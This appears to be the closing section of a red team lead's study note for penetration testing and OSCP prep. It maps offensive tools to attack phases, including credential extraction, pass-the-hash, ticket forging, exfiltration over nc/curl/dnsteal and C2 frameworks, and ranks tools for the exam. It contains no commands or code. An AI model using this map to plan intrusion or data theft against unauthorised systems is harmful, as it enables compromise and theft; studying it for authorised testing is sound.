| **Recon** | `shodan` | Internet-facing asset search |
| **Initial Access** | `responder` | LLMNR/NBT-NS poisoning and hash capture |
| **Initial Access** | `ntlmrelayx` | NTLM relay to capture sessions |
| **Initial Access** | `searchsploit` | Exploit database search |
| **Initial Access** | `msfconsole` | Metasploit framework |
| **Initial Access** | `sqlmap` | SQL injection exploitation |
| **Initial Access** | `hydra` / `medusa` | Password spraying |
| **Initial Access** | `evil-winrm` | WinRM shell (port 5985/5986) |
| **Post-Exploit** | `linpeas` / `winpeas` | Automated privilege escalation enumeration |
| **Post-Exploit** | `mimikatz` / `pypykatz` | Credential extraction |
| **Post-Exploit** | `secretsdump` | DCSync and SAM database extraction |
| **Post-Exploit** | `sharphound` | BloodHound AD data collection |
| **Post-Exploit** | `PowerSploit` | PowerShell exploitation toolkit |
| **Lateral Movement** | `crackmapexec` | Network-wide credential reuse and spraying |
| **Lateral Movement** | `psexec.py` / `smbexec.py` / `wmiexec.py` | Pass-the-Hash lateral movement |
| **Lateral Movement** | `evil-winrm` | Remote shell via WinRM |
| **Lateral Movement** | `pth-winexe` | Pass-the-Hash remote execution |
| **Domain Dominance** | `BloodHound` | AD attack path analysis |
| **Domain Dominance** | `GetUserSPNs` / `GetNPUsers` | Kerberoasting / AS-REP roasting |
| **Domain Dominance** | `ticketer.py` | Golden/silver ticket forging |
| **Domain Dominance** | `enum4linux` | LDAP/SMB user and share enumeration |
| **Pivoting** | `chisel` | HTTP-based pivot tunnel (SOCKS proxy) |
| **Pivoting** | `proxychains` | Redirect TCP traffic through proxies |
| **Pivoting** | `socat` | Port forwarding and redirecting |
| **Exfiltration** | `nc` / `ncat` | File transfer over TCP |
| **Exfiltration** | `curl` / `wget` | HTTP-based exfiltration |
| **Exfiltration** | `dnsteal` | DNS-based data exfiltration |
| **OPSEC** | `chisel` (with encryption) | Encrypted pivot tunnel |
| **OPSEC** | `proxychains` | Anonymize scanner traffic |
| **C2** | [[Sliver C2 - Red Team Operator Guide|Sliver]] | C2 framework (HTTP(S), DNS, WireGuard, mTLS) |
| **C2** | `Covenant` | C# based C2 framework |
| **C2** | `Empire` | PowerShell based C2 framework |
| **Reporting** | `CherryTree` / `Obsidian` | Note-taking with evidence organization |
| **Reporting** | `Dradis` | Collaboration and reporting platform |

### OSCP/OSCE Specific Tool Priority

For exam prep, master these in order:

1. **`nmap`** — you will scan a LOT, know all flags
2. **`searchsploit`** — find exploits for specific service versions
3. **`hydra`** — password spraying (especially SSH and HTTP forms)
4. **`sqlmap`** — SQL injection, especially time-based blind
5. **`msfvenom` + `msfconsole`** — exploit modules and payload generation
6. **`john`** + **`hashcat`** — password cracking
7. **`tcpdump`** + **`wireshark`** — packet analysis
8. **`netcat`** + **`ncat`** — file transfer, shells, port forwarding
9. **`gobuster`** — web directory and subdomain brute-forcing
10. **`responder` + `ntlmrelayx`** — NTLM relay attacks

---

> [!quote] The Operator's Mantra
> *"Enumerate thoroughly. Exploit selectively. Document obsessively. Elevate quietly. Pivot thoughtfully. Report professionally."*
> — Max, Red Team Lead

---

**Related Vault Notes:**
- [[Penetration Testing Lifecycle]] — the big picture
- [[TTPS]] — specific technique taxonomy
- [[Emulation Plan]] — threat actor emulation workflow
- [[Survey 101]] — post-compromise Linux triage
- [[Sliver C2 - Red Team Operator Guide]] — C2 setup and operators guide
- [[6 - Information Gathering]] — recon phase deep-dive
- [[5 - Report Writing]] — reporting format guide
- [[C2 and Recon Tools]] — quick C2 tool reference

---

*Last updated: 2026-04-24 | Author: Max (Red Team Lead)*
*OSCP-path aligned | Kali-native focus*
